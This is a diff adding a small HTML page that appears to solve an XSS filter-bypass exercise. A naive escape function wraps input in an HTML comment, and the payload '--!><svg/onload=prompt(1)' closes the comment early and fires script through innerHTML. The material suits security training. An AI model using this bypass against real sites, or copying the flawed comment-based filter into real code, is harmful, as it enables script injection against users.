@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <h1></h1>
+    <div id="body">
+    </div>
+    <script>
+        function escape(input) {
+            // filter potential comment end delimiters
+            input = input.replace(/->/g, '_');
+
+            // comment the input to avoid script execution
+            return '<!-- ' + input + ' -->';
+        }
+        // html的右邊注釋除了-->還有--!>
+        var input = "--!><svg/onload=prompt(1)";
+        var body = document.getElementById("body");
+        body.innerHTML = escape(input);          
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
